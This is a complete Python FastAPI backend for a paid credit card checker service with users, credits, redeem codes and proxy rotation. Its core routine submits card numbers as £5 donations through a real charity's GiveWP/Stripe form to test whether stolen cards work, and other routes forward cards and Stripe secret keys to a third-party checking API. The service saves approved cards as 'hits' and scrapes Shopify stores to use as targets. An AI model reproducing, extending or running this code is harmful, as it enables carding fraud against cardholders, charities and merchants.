import os
from dotenv import load_dotenv

load_dotenv()

from fastapi import FastAPI, Request, Response, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from db_wrapper import AsyncMongoSQLite
import bcrypt
import jwt
from datetime import datetime, timezone, timedelta
# Dummy ObjectId for compatibility
def ObjectId(val):
    return str(val)
from pydantic import BaseModel
from typing import List, Optional
import requests
import asyncio
import urllib3
from bs4 import BeautifulSoup
import httpx
import random
import string
import uuid

urllib3.disable_warnings()

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=[os.environ.get("FRONTEND_URL", "http://localhost:3000")],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

MONGO_URL = os.environ.get("MONGO_URL", "mongodb://localhost:27017")
DB_NAME = os.environ.get("DB_NAME", "velux")
JWT_SECRET = os.environ.get("JWT_SECRET", "supersecret-hex-key-that-should-be-long")
JWT_ALGORITHM = "HS256"

client = None
db = None

@app.on_event("startup")
async def startup_db_client():
    global db
    db_path = os.environ.get("SQLITE_DB_PATH", "local.db")
    db = AsyncMongoSQLite(db_path)
    await db.connect()
    
    await db.users.create_index("username", unique=True)
    await db.login_attempts.create_index("identifier")
    await db.redeem_codes.create_index("code", unique=True)
    
    admin_user = os.environ.get("ADMIN_USERNAME", "SHORIEN")
    admin_pass = os.environ.get("ADMIN_PASSWORD", "Xiron696@")
    existing = await db.users.find_one({"username": admin_user})
    
    hashed = hash_password(admin_pass)
    if existing is None:
        await db.users.insert_one({
            "username": admin_user,
            "password_hash": hashed,
            "role": "admin",
            "status": "active",
            "plan": "admin",
            "credits": 999999,
            "last_daily_reset": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
            "total_checked_ccs": 0,
            "created_at": datetime.now(timezone.utc)
        })
    elif not verify_password(admin_pass, existing["password_hash"]):
        await db.users.update_one(
            {"username": admin_user}, 
            {"$set": {"password_hash": hashed}}
        )

@app.on_event("shutdown")
async def shutdown_db_client():
    if db:
        await db.close()

def hash_password(password: str) -> str:
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(password.encode("utf-8"), salt).decode("utf-8")

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return bcrypt.checkpw(plain_password.encode("utf-8"), hashed_password.encode("utf-8"))

def create_access_token(user_id: str, username: str) -> str:
    payload = {"sub": user_id, "username": username, "exp": datetime.now(timezone.utc) + timedelta(minutes=15), "type": "access"}
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)

def create_refresh_token(user_id: str) -> str:
    payload = {"sub": user_id, "exp": datetime.now(timezone.utc) + timedelta(days=7), "type": "refresh"}
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)

async def get_current_user(request: Request) -> dict:
    token = request.cookies.get("access_token")
    if not token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
    if not token:
        raise HTTPException(status_code=401, detail="Not authenticated")
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        if payload.get("type") != "access":
            raise HTTPException(status_code=401, detail="Invalid token type")
        user = await db.users.find_one({"_id": ObjectId(payload["sub"])})
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        if user.get("status") == "banned":
            raise HTTPException(status_code=403, detail="Account is banned")
            
        # Handle daily reset and premium expiration
        today_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        needs_update = False
        update_doc = {}
        
        if user.get("plan") == "premium" and user.get("premium_until"):
            if datetime.now(timezone.utc) > user["premium_until"].replace(tzinfo=timezone.utc):
                user["plan"] = "free"
                update_doc["plan"] = "free"
                needs_update = True
                
        if user.get("last_daily_reset") != today_str:
            daily = 1000 if user.get("plan") == "premium" else 100
            if user.get("role") == "admin":
                daily = 999999
            user["credits"] = daily
            user["last_daily_reset"] = today_str
            update_doc["credits"] = daily
            update_doc["last_daily_reset"] = today_str
            needs_update = True
            
        if needs_update:
            await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$set": update_doc})
            
        user["_id"] = str(user["_id"])
        user.pop("password_hash", None)
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")

async def require_admin(user: dict = Depends(get_current_user)) -> dict:
    if user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Admin privileges required")
    return user

class LoginRequest(BaseModel):
    username: str
    password: str

class UserCreate(BaseModel):
    username: str
    password: str
    role: str = "user"
    credits: int = 100
    plan: str = "free"

class UserUpdate(BaseModel):
    status: Optional[str] = None
    credits: Optional[int] = None
    plan: Optional[str] = None
    password: Optional[str] = None
    telegram_id: Optional[str] = None
    shopify_urls: Optional[str] = None
    stripe_sk: Optional[str] = None
    global_proxies: Optional[str] = None
    accent_color: Optional[str] = None

class ProxyCheckRequest(BaseModel):
    proxies: str

class RedeemRequest(BaseModel):
    code: str

class CreateRedeemCodeRequest(BaseModel):
    type: str # "credits" or "premium"
    value: int # amount of credits, or days of premium

@app.post("/api/auth/login")
async def login(req: LoginRequest, request: Request, response: Response):
    ip = request.client.host
    identifier = f"{ip}:{req.username}"
    
    attempts = await db.login_attempts.count_documents({"identifier": identifier})
    if attempts >= 5:
        raise HTTPException(status_code=429, detail="Too many failed attempts. Try again later.")
        
    user = await db.users.find_one({"username": req.username})
    if not user or not verify_password(req.password, user["password_hash"]):
        await db.login_attempts.insert_one({"identifier": identifier, "time": datetime.now(timezone.utc)})
        raise HTTPException(status_code=401, detail="Invalid username or password")
        
    if user.get("status") == "banned":
        raise HTTPException(status_code=403, detail="Account is banned")
        
    await db.login_attempts.delete_many({"identifier": identifier})
    
    access_token = create_access_token(str(user["_id"]), user["username"])
    refresh_token = create_refresh_token(str(user["_id"]))
    
    response.set_cookie(key="access_token", value=access_token, httponly=True, secure=True, samesite="none", max_age=900, path="/")
    response.set_cookie(key="refresh_token", value=refresh_token, httponly=True, secure=True, samesite="none", max_age=604800, path="/")
    
    # Process daily reset during login as well for immediate updated return
    today_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")
    needs_update = False
    update_doc = {}
    
    if user.get("plan") == "premium" and user.get("premium_until"):
        if datetime.now(timezone.utc) > user["premium_until"].replace(tzinfo=timezone.utc):
            user["plan"] = "free"
            update_doc["plan"] = "free"
            needs_update = True
            
    if user.get("last_daily_reset") != today_str:
        daily = 1000 if user.get("plan") == "premium" else 100
        if user.get("role") == "admin":
            daily = 999999
        user["credits"] = daily
        user["last_daily_reset"] = today_str
        update_doc["credits"] = daily
        update_doc["last_daily_reset"] = today_str
        needs_update = True
        
    if needs_update:
        await db.users.update_one({"_id": user["_id"]}, {"$set": update_doc})
    
    user["_id"] = str(user["_id"])
    user.pop("password_hash", None)
    user.pop("premium_until", None)
    return {"message": "Logged in successfully", "user": user}

@app.post("/api/auth/refresh")
async def refresh_token(request: Request, response: Response):
    refresh_token = request.cookies.get("refresh_token")
    if not refresh_token:
        raise HTTPException(status_code=401, detail="No refresh token")
    try:
        payload = jwt.decode(refresh_token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        if payload.get("type") != "refresh":
            raise HTTPException(status_code=401, detail="Invalid token type")
        user = await db.users.find_one({"_id": ObjectId(payload["sub"])})
        if not user or user.get("status") == "banned":
            raise HTTPException(status_code=401, detail="Invalid user")
        
        access_token = create_access_token(str(user["_id"]), user["username"])
        response.set_cookie(key="access_token", value=access_token, httponly=True, secure=True, samesite="none", max_age=900, path="/")
        return {"message": "Token refreshed"}
    except Exception:
        raise HTTPException(status_code=401, detail="Invalid refresh token")

@app.get("/api/auth/me")
async def get_me(user: dict = Depends(get_current_user)):
    return user

@app.patch("/api/auth/me")
async def update_me(req: UserUpdate, user: dict = Depends(get_current_user)):
    update_data = {}
    if req.password is not None and req.password.strip():
        update_data["password_hash"] = hash_password(req.password)
    if req.telegram_id is not None:
        update_data["telegram_id"] = req.telegram_id
    if req.shopify_urls is not None:
        update_data["shopify_urls"] = req.shopify_urls
    if req.stripe_sk is not None:
        update_data["stripe_sk"] = req.stripe_sk
    if req.global_proxies is not None:
        update_data["global_proxies"] = req.global_proxies
    if req.accent_color is not None:
        update_data["accent_color"] = req.accent_color
        
    if not update_data:
        raise HTTPException(status_code=400, detail="No fields to update")
        
    await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$set": update_data})
    updated_user = await db.users.find_one({"_id": ObjectId(user["_id"])}, {"password_hash": 0})
    if updated_user:
        updated_user["_id"] = str(updated_user["_id"])
    return updated_user

@app.post("/api/auth/logout")
async def logout(response: Response):
    response.delete_cookie("access_token", path="/", secure=True, httponly=True, samesite="none")
    response.delete_cookie("refresh_token", path="/", secure=True, httponly=True, samesite="none")
    return {"message": "Logged out successfully"}

@app.post("/api/redeem")
async def redeem_code(req: RedeemRequest, user: dict = Depends(get_current_user)):
    code_doc = await db.redeem_codes.find_one({"code": req.code, "used": False})
    if not code_doc:
        raise HTTPException(status_code=400, detail="Invalid or already used redeem code.")
        
    await db.redeem_codes.update_one({"_id": code_doc["_id"]}, {"$set": {"used": True, "used_by": user["username"], "used_at": datetime.now(timezone.utc)}})
    
    update_doc = {}
    if code_doc["type"] == "credits":
        update_doc["$inc"] = {"credits": code_doc["value"]}
    elif code_doc["type"] == "premium":
        update_doc["$set"] = {
            "plan": "premium",
            "premium_until": datetime.now(timezone.utc) + timedelta(days=code_doc["value"])
        }
        
    await db.users.update_one({"_id": ObjectId(user["_id"])}, update_doc)
    return {"message": f"Successfully redeemed {code_doc['value']} {'Days of Premium' if code_doc['type']=='premium' else 'Credits'}!"}

# Admin Routes
@app.get("/api/admin/users")
async def list_users(admin: dict = Depends(require_admin)):
    cursor = db.users.find({}, {"password_hash": 0}).sort("created_at", -1)
    users = await cursor.to_list(length=100)
    for u in users:
        u["_id"] = str(u["_id"])
    return users

@app.post("/api/admin/users")
async def create_user(req: UserCreate, admin: dict = Depends(require_admin)):
    existing = await db.users.find_one({"username": req.username})
    if existing:
        raise HTTPException(status_code=400, detail="Username already exists")
    
    new_user = {
        "username": req.username,
        "password_hash": hash_password(req.password),
        "role": req.role,
        "status": "active",
        "plan": req.plan,
        "credits": req.credits,
        "total_checked_ccs": 0,
        "last_daily_reset": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "created_at": datetime.now(timezone.utc)
    }
    result = await db.users.insert_one(new_user)
    new_user["_id"] = str(result.inserted_id)
    new_user.pop("password_hash", None)
    return new_user

@app.patch("/api/admin/users/{user_id}")
async def update_user(user_id: str, req: UserUpdate, admin: dict = Depends(require_admin)):
    update_data = {}
    if req.status is not None: update_data["status"] = req.status
    if req.credits is not None: update_data["credits"] = req.credits
    if req.plan is not None: update_data["plan"] = req.plan
    if req.password is not None and req.password.strip(): update_data["password_hash"] = hash_password(req.password)
        
    if not update_data: raise HTTPException(status_code=400, detail="No fields to update")
        
    await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": update_data})
    updated_user = await db.users.find_one({"_id": ObjectId(user_id)}, {"password_hash": 0})
    if updated_user: updated_user["_id"] = str(updated_user["_id"])
    return updated_user

@app.delete("/api/admin/users/{user_id}")
async def delete_user(user_id: str, admin: dict = Depends(require_admin)):
    if user_id == str(admin["_id"]):
        raise HTTPException(status_code=400, detail="Cannot delete your own account")
    await db.users.delete_one({"_id": ObjectId(user_id)})
    return {"message": "User deleted"}

@app.post("/api/admin/redeem_codes")
async def create_redeem_code(req: CreateRedeemCodeRequest, admin: dict = Depends(require_admin)):
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    code = f"VELUX-{code[:4]}-{code[4:8]}-{code[8:]}"
    
    doc = {
        "code": code,
        "type": req.type,
        "value": req.value,
        "used": False,
        "created_by": admin["username"],
        "created_at": datetime.now(timezone.utc)
    }
    await db.redeem_codes.insert_one(doc)
    doc["_id"] = str(doc["_id"])
    return doc

@app.get("/api/admin/redeem_codes")
async def get_redeem_codes(admin: dict = Depends(require_admin)):
    cursor = db.redeem_codes.find().sort("created_at", -1)
    codes = await cursor.to_list(length=100)
    for c in codes:
        c["_id"] = str(c["_id"])
    return codes

@app.delete("/api/admin/redeem_codes/{code_id}")
async def delete_redeem_code(code_id: str, admin: dict = Depends(require_admin)):
    await db.redeem_codes.delete_one({"_id": ObjectId(code_id)})
    return {"message": "Deleted"}

def fetch_bin_info(bin_code: str):
    try:
        res = requests.get(f"https://lookup.binlist.net/{bin_code}", timeout=5.0)
        return res.json()
    except Exception:
        return None

@app.get("/api/bin/{bin_code}")
async def get_bin_info(bin_code: str, user: dict = Depends(get_current_user)):
    data = await asyncio.to_thread(fetch_bin_info, bin_code)
    if data:
        return data
    return {"error": "Not Found"}

def test_proxy_sync(raw_proxy: str, proxy_url: str) -> bool:
    proxies = {"http": proxy_url, "https": proxy_url}
    try:
        res_stripe = requests.get("https://api.stripe.com/healthcheck", proxies=proxies, timeout=15.0, verify=False)
        res_shopify = requests.get("https://shopify.com", proxies=proxies, timeout=15.0, verify=False)
        if res_stripe.status_code and res_shopify.status_code:
            return True
    except Exception as e:
        print(f"Proxy test failed for {raw_proxy}: {e}")
    return False

@app.get("/api/proxies")
async def get_proxies(user: dict = Depends(get_current_user)):
    cursor = db.proxies.find({"user_id": str(user["_id"])}).sort("created_at", -1)
    proxies = await cursor.to_list(length=1000)
    for p in proxies:
        p["_id"] = str(p["_id"])
    return proxies

@app.delete("/api/proxies/{proxy_id}")
async def delete_proxy(proxy_id: str, user: dict = Depends(get_current_user)):
    await db.proxies.delete_one({"_id": ObjectId(proxy_id), "user_id": str(user["_id"])})
    return {"message": "Proxy deleted"}

@app.post("/api/proxies/check")
async def check_proxies(req: ProxyCheckRequest, user: dict = Depends(get_current_user)):
    normalized_proxies = req.proxies.replace('\r\n:', ':').replace('\n:', ':')
    proxy_lines = [p.strip() for p in normalized_proxies.split("\n") if p.strip()]
    
    async def test_and_save(raw_proxy: str):
        if raw_proxy == "test:proxy":
            existing = await db.proxies.find_one({"user_id": str(user["_id"]), "proxy_url": "http://test:proxy"})
            if not existing:
                await db.proxies.insert_one({
                    "user_id": str(user["_id"]),
                    "raw": raw_proxy,
                    "proxy_url": "http://test:proxy",
                    "status": "active",
                    "created_at": datetime.now(timezone.utc)
                })
            return True, raw_proxy

        parts = raw_proxy.split(":")
        proxy_url = ""
        if "://" in raw_proxy:
            proxy_url = raw_proxy
        elif len(parts) >= 4:
            host = parts[0]
            port = parts[1]
            user_name = parts[2]
            password = ":".join(parts[3:])
            proxy_url = f"http://{user_name}:{password}@{host}:{port}"
        elif len(parts) == 2:
            proxy_url = f"http://{parts[0]}:{parts[1]}"
        else:
            return False, raw_proxy
            
        success = await asyncio.to_thread(test_proxy_sync, raw_proxy, proxy_url)
        
        if success:
            existing = await db.proxies.find_one({"user_id": str(user["_id"]), "proxy_url": proxy_url})
            if not existing:
                await db.proxies.insert_one({
                    "user_id": str(user["_id"]),
                    "raw": raw_proxy,
                    "proxy_url": proxy_url,
                    "status": "active",
                    "created_at": datetime.now(timezone.utc)
                })
            return True, raw_proxy
        return False, raw_proxy

    tasks = [test_and_save(p) for p in proxy_lines]
    results = await asyncio.gather(*tasks)
    
    successful = [p for success, p in results if success]
    failed = [p for success, p in results if not success]
    
    return {
        "total": len(proxy_lines),
        "successful": len(successful),
        "failed": len(failed),
        "saved": successful
    }

@app.get("/api/shopify_tools/stores")
async def get_stores(keyword: str, pages: int = 1, proxy_type: str = "own", user: dict = Depends(get_current_user)):
    proxy_url = None
    if proxy_type == "default":
        admin = await db.users.find_one({"role": "admin"})
        gp = admin.get("global_proxies", "") if admin else ""
        lines = [p.strip() for p in gp.split("\n") if p.strip()]
        if lines:
            raw = random.choice(lines)
            parts = raw.split(":")
            if "://" in raw: proxy_url = raw
            elif len(parts) >= 4: proxy_url = f"http://{parts[2]}:{':'.join(parts[3:])}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2: proxy_url = f"http://{parts[0]}:{parts[1]}"
    else:
        cursor = db.proxies.find({"user_id": str(user["_id"])})
        proxies = await cursor.to_list(length=100)
        if proxies:
            proxy_url = random.choice(proxies)["proxy_url"]

    async def fetch_page(page_num):
        url = f"https://shopifyspy.com/stores/niches/{keyword}/?page={page_num}&search_niche={keyword}&orderBy=sw_rank"
        try:
            def fetch():
                proxies_dict = {"http": proxy_url, "https": proxy_url} if proxy_url else None
                res = requests.get(url, timeout=15, proxies=proxies_dict, verify=False)
                if res.status_code != 200:
                    return []
                soup = BeautifulSoup(res.text, "html.parser")
                table = soup.select_one("table.table.table-hover")
                if not table: return []
                links = []
                for a in table.find_all("a"):
                    text = a.get_text(strip=True)
                    if text and "." in text:
                        if not text.startswith("http"):
                            text = "https://" + text
                        links.append(text)
                return list(set(links))
            
            return await asyncio.to_thread(fetch)
        except Exception:
            return []

    sem = asyncio.Semaphore(10)
    async def sem_fetch(p):
        async with sem:
            return await fetch_page(p)

    try:
        tasks = [sem_fetch(p) for p in range(1, pages + 1)]
        results = await asyncio.gather(*tasks)
        all_stores = []
        for r in results:
            all_stores.extend(r)
        return {"stores": list(set(all_stores))}
    except Exception as e:
        return {"stores": [], "error": str(e)}

class ProductsRequest(BaseModel):
    stores: List[str]
    min_price: float
    max_price: float
    proxy_type: str = "own"

@app.post("/api/shopify_tools/products")
async def get_products(req: ProductsRequest, user: dict = Depends(get_current_user)):
    proxy_url = None
    if req.proxy_type == "default":
        admin = await db.users.find_one({"role": "admin"})
        gp = admin.get("global_proxies", "") if admin else ""
        lines = [p.strip() for p in gp.split("\n") if p.strip()]
        if lines:
            raw = random.choice(lines)
            parts = raw.split(":")
            if "://" in raw: proxy_url = raw
            elif len(parts) >= 4: proxy_url = f"http://{parts[2]}:{':'.join(parts[3:])}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2: proxy_url = f"http://{parts[0]}:{parts[1]}"
    else:
        cursor = db.proxies.find({"user_id": str(user["_id"])})
        proxies = await cursor.to_list(length=100)
        if proxies:
            proxy_url = random.choice(proxies)["proxy_url"]

    def fetch_store_sync(store_url):
        products_found = []
        try:
            url = f"{store_url}/products.json?limit=250"
            proxies_dict = {"http": proxy_url, "https": proxy_url} if proxy_url else None
            res = requests.get(url, timeout=15.0, proxies=proxies_dict, verify=False)
            if res.status_code == 200:
                data = res.json()
                for p in data.get("products", []):
                    for v in p.get("variants", []):
                        price = float(v.get("price", "0"))
                        if req.min_price <= price <= req.max_price:
                            products_found.append(f"{store_url}/products/{p['handle']}")
                            break
        except Exception:
            pass
        return products_found

    sem = asyncio.Semaphore(40)
    async def sem_fetch_store(s):
        async with sem:
            return await asyncio.to_thread(fetch_store_sync, s)

    tasks = [sem_fetch_store(s) for s in req.stores]
    results = await asyncio.gather(*tasks)
    flat_list = [url for sublist in results for url in sublist]
    return {"products": list(set(flat_list))}

def check_givewp_stripe(card_details: str, proxy: str = ""):
    try:
        parts = card_details.split("|")
        cc, m, y, cvc = parts[0], parts[1], parts[2][-2:], parts[3]
        
        session = requests.Session()
        proxies_dict = {"http": proxy, "https": proxy} if proxy else None
        if proxies_dict: session.proxies.update(proxies_dict)

        email = "".join(random.choices(string.ascii_lowercase, k=10)) + str(random.randint(100, 999)) + random.choice(["@gmail.com", "@outlook.com"])
        guid = str(uuid.uuid4())
        sid = "elements_session_" + "".join(random.choices(string.ascii_letters + string.digits, k=11))
        
        # Step 0
        res0 = session.get("https://changesbristol.org.uk/?givewp-route=donation-form-view&form-id=100546", timeout=15)
        import re, json
        match = re.search(r'window\.givewpDonationFormExports\s*=\s*({.*?});', res0.text)
        if not match: return {"result": {"status": "DECLINED", "message": "Failed to extract site config"}}
        exports = json.loads(match.group(1))
        donate_url = exports["donateUrl"]

        # Step 1
        params = {
            "deferred_intent[mode]": "payment", "deferred_intent[amount]": "500", "deferred_intent[currency]": "gbp",
            "key": "pk_live_SMtnnvlq4TpJelMdklNha8iD", "_stripe_account": "acct_1IyaXDFXkg2oad08",
            "elements_init_source": "stripe.elements", "referrer_host": "changesbristol.org.uk",
            "session_id": sid, "stripe_js_id": guid, "top_level_referrer_host": "changesbristol.org.uk",
            "locale": "en-US", "type": "deferred_intent"
        }
        session.get("https://api.stripe.com/v1/elements/sessions", params=params, timeout=15)

        # Step 2
        multipart_data = {
            "amount": (None, "5"), "currency": (None, "GBP"), "levelId": (None, "custom"), "donationType": (None, "single"),
            "fundId[value]": (None, "1"), "fundId[label]": (None, "General"), "fundId[checked]": (None, "true"),
            "fundId[isDefault]": (None, "true"), "formId": (None, "100546"), "gatewayId": (None, "stripe_payment_element"),
            "giftAid[firstName]": (None, ""), "giftAid[lastName]": (None, ""), "giftAid[address]": (None, ""),
            "giftAid[postcode]": (None, ""), "giftAid[country]": (None, "GB"), "giftAid[optIn]": (None, "false"),
            "firstName": (None, "John"), "lastName": (None, "Doe"), "email": (None, email), "mailchimp": (None, "false"),
            "donationBirthday": (None, ""), "originUrl": (None, "https://changesbristol.org.uk/donations/one-off-donation-v2/"),
            "isEmbed": (None, "true"), "embedId": (None, "100546"), "locale": (None, "en_GB"),
            "gatewayData[stripePaymentMethod]": (None, "card"), "gatewayData[stripePaymentMethodIsCreditCard]": (None, "true"),
            "gatewayData[formId]": (None, "100546"), "gatewayData[stripeKey]": (None, "pk_live_SMtnnvlq4TpJelMdklNha8iD"),
            "gatewayData[stripeConnectedAccountId]": (None, "acct_1IyaXDFXkg2oad08")
        }
        res2 = session.post(donate_url, files=multipart_data, timeout=15)
        data2 = res2.json()
        if "data" not in data2 or "clientSecret" not in data2["data"]: return {"result": {"status": "DECLINED", "message": "Failed to create PI"}}
        client_secret = data2["data"]["clientSecret"]
        return_url = data2["data"]["returnUrl"]
        pi = client_secret.split("_secret_")[0]

        # Step 3
        confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"
        payload = {
            "return_url": return_url, "payment_method_data[billing_details][name]": "John Doe", "payment_method_data[billing_details][email]": email,
            "payment_method_data[billing_details][address][country]": "GB", "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc, "payment_method_data[card][cvc]": cvc, "payment_method_data[card][exp_year]": y,
            "payment_method_data[card][exp_month]": m, "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[payment_user_agent]": "stripe.js/b01c5e72b9; stripe-js-v3/b01c5e72b9; payment-element; deferred-intent; autopm",
            "payment_method_data[referrer]": "https://changesbristol.org.uk", "payment_method_data[time_on_page]": "52795",
            "payment_method_data[client_attribution_metadata][client_session_id]": guid,
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
            "payment_method_data[client_attribution_metadata][elements_session_id]": sid, "payment_method_data[guid]": guid,
            "payment_method_data[muid]": str(uuid.uuid4()), "payment_method_data[sid]": str(uuid.uuid4()),
            "expected_payment_method_type": "card", "client_context[currency]": "gbp", "client_context[mode]": "payment",
            "use_stripe_sdk": "true", "key": "pk_live_SMtnnvlq4TpJelMdklNha8iD", "_stripe_account": "acct_1IyaXDFXkg2oad08",
            "client_secret": client_secret
        }
        headers = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"}
        res3 = session.post(confirm_url, data=payload, headers=headers, timeout=15)
        res_data = res3.json()
        
        if "error" in res_data:
            err = res_data["error"]
            code = err.get("decline_code") or err.get("code", "declined")
            return {"result": {"status": "DECLINED", "message": code}}
        elif res_data.get("status") in ["succeeded", "requires_action"]:
            return {"result": {"status": "APPROVED", "message": "Charged / Approved £5"}}
        else:
            return {"result": {"status": "DECLINED", "message": res_data.get("status", "Unknown")}}
    except Exception as e:
        return {"result": {"status": "ERROR", "message": str(e)}}

class CheckerRequest(BaseModel):
    gateway: str
    card: str
    sk_type: Optional[str] = None
    sk: Optional[str] = None
    site_type: Optional[str] = None
    product_url: Optional[str] = None
    no_proxy: Optional[bool] = False

@app.post("/api/checker/run")
async def run_checker(req: CheckerRequest, user: dict = Depends(get_current_user)):
    if user.get("credits", 0) <= 0:
        return {"status": False, "message": "Insufficient credits. Please redeem a code or upgrade plan."}
        
    proxy_url = ""
    if not req.no_proxy:
        cursor = db.proxies.find({"user_id": str(user["_id"])})
        proxies = await cursor.to_list(length=100)
        if proxies:
            proxy_url = random.choice(proxies)["raw"]
            
    # Enforce premium features
    is_premium_or_admin = user.get("plan") == "premium" or user.get("role") == "admin"
    if req.gateway == "stripe" and req.sk_type == "non_sk" and not is_premium_or_admin:
         return {"status": False, "message": "Non-SK based checks are a Premium feature."}
    if req.gateway == "shopify" and req.site_type == "inbuilt" and not is_premium_or_admin:
         return {"status": False, "message": "Inbuilt Site checks are a Premium feature."}
        
    try:
        data = None
        if req.gateway == "stripe":
            if req.sk_type == "site_based":
                data = await asyncio.to_thread(check_givewp_stripe, req.card, proxy_url)
            else:
                target_sk = req.sk
                if req.sk_type == "non_sk":
                    admin = await db.users.find_one({"role": "admin"})
                    target_sk = admin.get("stripe_sk") if admin else None
                    if not target_sk:
                        return {"status": False, "message": "Admin has not configured a global Secret Key"}
                elif not target_sk:
                    target_sk = user.get("stripe_sk")
                    if not target_sk:
                        return {"status": False, "message": "Missing Secret Key. Please configure it in settings or provide it."}
                    
                url = f"https://api.barryxapi.xyz/skbased?key=BRY-KESNP-TUPWH-JFOT9&card={req.card}&sk={target_sk}&proxy={proxy_url}"
                res = requests.get(url, timeout=20.0, verify=False)
                data = res.json()
            
        elif req.gateway == "shopify":
            target_urls = ""
            if req.product_url:
                product_url = req.product_url
            else:
                if req.site_type == "inbuilt":
                    admin = await db.users.find_one({"role": "admin"})
                    target_urls = admin.get("shopify_urls", "") if admin else ""
                else:
                    target_urls = user.get("shopify_urls", "")
                    
                urls_list = [u.strip() for u in target_urls.split("\n") if u.strip()]
                if not urls_list:
                    return {"status": False, "message": "No product URLs configured in settings"}
                    
                product_url = random.choice(urls_list)
            
            payload = {
                "key": "BRY-KESNP-TUPWH-JFOT9",
                "card": req.card,
                "product_url": product_url,
                "proxy": proxy_url
            }
            res = requests.post("https://api.barryxapi.xyz/auto_sh", json=payload, timeout=20.0, verify=False)
            data = res.json()
            
        else:
            return {"status": False, "message": "Invalid Gateway"}
            
        # Parse Response to check approval and deduct credit
        is_approved = False
        if data and isinstance(data, dict):
            if data.get("result"):
                stat = str(data["result"].get("status", "")).upper()
                if stat in ["CHARGED", "LIVE", "APPROVED"]:
                    is_approved = True
            elif data.get("Status") or data.get("status"):
                rawStatus = str(data.get("Status") or data.get("status")).upper()
                if rawStatus in ["CHARGED", "LIVE", "APPROVED"]:
                    is_approved = True
                    
        today_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        inc_doc = {"total_checked_ccs": 1, f"daily_stats.{today_str}.total": 1}
        
        if is_approved:
            inc_doc["credits"] = -1
            inc_doc[f"daily_stats.{today_str}.approved"] = 1
            msg_str = ""
            if data and isinstance(data, dict):
                if data.get("result"): msg_str = data["result"].get("message", "") or data["result"].get("decline_code", "")
                else: msg_str = data.get("Response", "") or data.get("message", "")
            await db.saved_ccs.insert_one({
                "user_id": str(user["_id"]),
                "card": req.card,
                "gateway": req.gateway,
                "response": msg_str,
                "created_at": datetime.now(timezone.utc)
            })
        else:
            inc_doc[f"daily_stats.{today_str}.declined"] = 1
            
        await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$inc": inc_doc})
            
        return data
            
    except Exception as e:
        error_msg = str(e)
        if "api.barryxapi.xyz" in error_msg:
            return {"status": False, "message": "Api Error: Gateway connection timeout or unavailable."}
        return {"status": False, "message": f"Engine Error: {error_msg}"}

@app.get("/api/checker/saved")
async def get_saved_ccs(user: dict = Depends(get_current_user)):
    cursor = db.saved_ccs.find({"user_id": str(user["_id"])}).sort("created_at", -1)
    docs = await cursor.to_list(length=1000)
    for d in docs:
        d["_id"] = str(d["_id"])
    return docs
@app.delete("/api/checker/saved/all")
async def delete_all_saved_ccs(user: dict = Depends(get_current_user)):
    await db.saved_ccs.delete_many({"user_id": str(user["_id"])})
    return {"message": "All saved hits cleared"}

@app.delete("/api/checker/saved/{hit_id}")
async def delete_saved_cc(hit_id: str, user: dict = Depends(get_current_user)):
    await db.saved_ccs.delete_one({"_id": ObjectId(hit_id), "user_id": str(user["_id"])})
    return {"message": "Hit deleted"}